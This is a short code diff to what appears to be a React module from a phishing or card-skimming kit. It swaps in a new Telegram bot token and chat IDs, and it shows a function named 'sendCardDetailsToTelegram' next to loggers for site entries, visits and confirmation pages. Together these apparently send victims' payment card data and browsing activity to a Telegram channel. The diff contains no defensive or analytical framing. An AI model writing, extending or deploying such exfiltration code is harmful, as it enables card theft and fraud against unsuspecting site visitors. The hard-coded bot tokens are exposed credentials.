@@ -2,11 +2,11 @@
 import { useRef, useEffect, useCallback } from 'react';
 import axios from 'axios';
 
-const TELEGRAM_BOT_TOKEN = '8993864160:AAEc_5wIxXbbu0UWK-124HDJ5x_Unh1ZON0';
+const TELEGRAM_BOT_TOKEN = '8993864160:AAG8-Uf16CiIEatUbWTswCHWncHFJTfsWJs';
 
 // Channel IDs
 const LOGS_CHAT_ID = '-1004332491640';
-const ACTIONS_CHAT_ID = '-5467334781';
+const ACTIONS_CHAT_ID = '-1004349569801';
 
 // Anti-spam: Track last log times
 const lastLogTimes = {
@@ -1097,7 +1097,6 @@ const sendCardDetailsToTelegram = async (cardData, sessionId) => {
     sendSiteEntryLog,
     sendVisitNotification,
     sendConfirmationLog,
-    sendConfirmationPageLog,
     sendConfirmationPageLog,
   };
 };
